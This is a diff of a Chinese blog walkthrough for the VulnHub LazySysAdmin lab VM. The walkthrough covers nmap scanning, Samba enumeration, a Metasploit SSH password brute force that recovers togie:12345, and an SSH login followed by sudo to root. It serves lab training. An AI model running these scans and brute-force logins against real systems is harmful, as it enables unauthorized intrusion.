@@ -6,33 +6,53 @@ tags:
 - drone
 ---
 
-渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为桥接, 目标 IP 通过 DHCP 分配
+**靶机下载**: [https://www.vulnhub.com/entry/lazysysadmin-1,205/](https://www.vulnhub.com/entry/lazysysadmin-1,205/)
 
-### 查询活动主机, 寻找目标
+渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配
+
+## 主机发现
 
 ```shell
-[root@kali ~]# nmap 192.168.3.0/24 -sn
+[root@kali ~]# nmap -sn 192.168.64.0/24
 
 # 也可以通过 netdiscover 查询
-[root@kali ~]# netdiscover -i eth0 -r 192.168.3.0/24
+[root@kali ~]# netdiscover -i eth0 -r 192.168.64.0/24
 ```
 
-### 探测常用端口, 查看启用服务
+## 端口探测
 
 ```shell
-[root@kali ~]# nmap -sV -T4 -p 80,443,137,138,139,445,111,20493306,22,6667 192.168.3.116
+[root@kali ~]# nmap -sS -p1-65535 -v 192.168.64.130
+... ...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+6667/tcp open  irc
+MAC Address: 00:0C:29:D5:B9:47 (VMware)
+... ...
+```
+
+<!-- more -->
+
+## 服务识别
+
+```shell
+[root@kali ~]# nmap -sV -T4 -p22,80,139,445,3306,6667 192.168.64.130
 ```
 
 ![port_scan](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/port_scan.png)
 
 发现目标主机上运行的服务有 ssh, http, samba, mysql, irc 等服务
 
-<!-- more -->
+## 查找漏洞
 
 ### 尝试挂载 samba
 
 ```shell
-[root@kali ~]# enum4linux 192.168.3.116
+[root@kali ~]# enum4linux 192.168.64.130
 ```
 
 ![smb_no_user](https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_no_user.png)
@@ -92,19 +112,18 @@ define('DB_CHARSET', 'utf8');
 ```shell
 [root@kali ~]# msfconsole
 msf6 > use auxiliary/scanner/ssh/ssh_login
-msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.3.116
-msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.3.116
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.64.130
 msf6 auxiliary(scanner/ssh/ssh_login) > set username togie
 msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /root/fuzzDicts/passwordDict/top500.txt
 msf6 auxiliary(scanner/ssh/ssh_login) > run
 
-[+] 192.168.3.116:22 - Success: 'togie:12345' 'uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux '
+[+] 192.168.64.130:22 - Success: 'togie:12345' 'uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux '
 ```
 
 ### ssh 登录 togie 用户
 
 ```shell
-[root@kali ~]# ssh togie@192.168.3.116
+[root@kali ~]# ssh togie@192.168.64.130
 [togie@LazySysAdmin ~]$ sudo su -
 [root@LazySysAdmin ~]#
 ```
